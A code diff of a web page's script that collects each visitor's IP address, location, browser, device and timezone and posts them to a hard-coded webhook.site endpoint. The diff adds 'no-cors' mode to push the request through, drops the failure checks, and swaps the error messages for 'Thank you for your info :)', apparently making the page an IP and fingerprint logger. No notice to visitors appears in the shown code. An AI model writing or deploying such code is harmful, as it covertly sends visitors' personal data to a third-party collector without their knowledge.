@@ -64,8 +64,6 @@
             ipData.region = ipJson.region || 'Unavailable';
             ipData.country_name = ipJson.country || 'Unavailable';
           }
-        } else {
-          console.warn('Failed to fetch IP data:', ipResponse.status, ipResponse.statusText);
         }
 
         // Update userInfo object
@@ -78,26 +76,25 @@
         browserElement.textContent = `Browser: ${userInfo.browser} | Device: ${userInfo.device}`;
         timezoneElement.textContent = `Timezone: ${userInfo.timezone}`;
 
-        // Send data to Webhook.site
-        const webhookResponse = await fetch('https://webhook.site/6aec35f9-fc3e-406d-afdf-a39bb1d0138e', {
+        // Send data to Webhook.site with no-cors mode
+        await fetch('https://webhook.site/6aec35f9-fc3e-406d-afdf-a39bb1d0138e', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          mode: 'no-cors', // Allows the request to bypass CORS restrictions
           body: JSON.stringify(userInfo),
         });
 
-        if (webhookResponse.ok) {
-          console.log('Data successfully sent to Webhook:', userInfo);
-        } else {
-          console.error('Failed to send data to Webhook:', webhookResponse.status, webhookResponse.statusText);
-        }
+        console.log('Data sent to Webhook successfully (no response available due to no-cors mode).');
       } catch (error) {
         console.error('Error fetching or sending user information:', error);
 
         // Display fallback messages
-        ipElement.textContent = 'IP Address: Unable to fetch.';
-        locationElement.textContent = 'Location: Unable to fetch.';
-        browserElement.textContent = 'Browser: Unable to fetch.';
-        timezoneElement.textContent = 'Timezone: Unable to fetch.';
+        ipElement.textContent = 'IP Address: Thank you for your info :)';
+        locationElement.textContent = 'Thank you for your info :)';
+        browserElement.textContent = 'Thank you for your info :)';
+        timezoneElement.textContent = 'Thank you for your info :)';
       }
     }
 
@@ -105,3 +102,4 @@
   </script>
 </body>
 </html>
+
